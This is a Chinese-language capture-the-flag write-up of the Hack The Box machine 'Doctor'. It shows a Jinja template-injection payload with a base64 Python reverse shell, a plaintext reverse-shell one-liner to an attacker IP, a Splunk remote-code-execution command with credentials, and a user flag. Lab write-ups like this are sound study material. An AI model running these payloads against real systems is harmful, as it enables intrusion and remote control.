# 记录

目标：10.10.10.209



## 端口扫描

```
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd

commonName=SplunkServerDefaultCert/organizationName=SplunkUser
```





## 80端口http服务渗透

资产

```
http://10.10.10.209/index.html
http://10.10.10.209/departments.html
http://10.10.10.209/about.html
http://10.10.10.209/blog.html
http://10.10.10.209/contact.html
感觉上面那几个一摸一样

```

存在目录浏览

Apache/2.4.41 (Ubuntu)



人员信息：Dr. Jade Guzman

Dr. Hannah Ford

Dr. James Wilson

电话：1-999-123-4567

邮箱：info@doctors.htb



看了wp发现将http的host头改为：`Host: doctors.htb`，就会进入一个新的站点

在注释中找到开发中的站点：`http://doctors.htb/archive`

Werkzeug/1.0.1 Python/3.8.2

发表一些文章后发现是显示标题的地方，存在ssti漏洞

```
{{config.__class__.__mro__[2].__subclasses__()[318].__init__.__getattribute__("__globals__")["os"].system(request.args.exp)}}

http://doctors.htb/archive?exp=python3%20-c%20%27import%20base64;exec(base64.b64decode(%22aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjYzIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vYmFzaCIsIi1pIl0pOw==%22))%27
```



```
import os


class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY')
    WTF_CSRF_CHECK_DEFAULT = False
    SQLALCHEMY_DATABASE_URI = os.environ.get('SQLALCHEMY_DATABASE_URI')
    MAIL_SERVER = ''
    MAIL_PORT = 587
    MAIL_USE_TLS = True
    MAIL_USERNAME = "doctor"
    MAIL_PASSWORD = "doctor"

```



splunkd -p 8089 start

打穿splunkd 就可以拿到root权限



pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)

在查看apache的日志时发现：

![image-20201106234828739](https://raw.githubusercontent.com/Explorersss/photo/master/20201106234828.png)

user_flag:856293e0074517cb670a14f80cf77ceb







## 8089端口https服务

**Splunk build:** 8.0.5

爆破一波密码无果

用shaun的账号密码试了一下登入成功！！！！

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.63",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```



百度一下splunk api rce找到https://github.com/burntoberoot/splunk_pentest_cheatsheet

```
python3 PySplunkWhisperer2_remote.py --scheme https --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --payload='python3 /tmp/exp.py' --lhost=10.10.14.63
```



ROOOOOOOOOT



![image-20201107021528945](https://raw.githubusercontent.com/Explorersss/photo/master/20201107021529.png)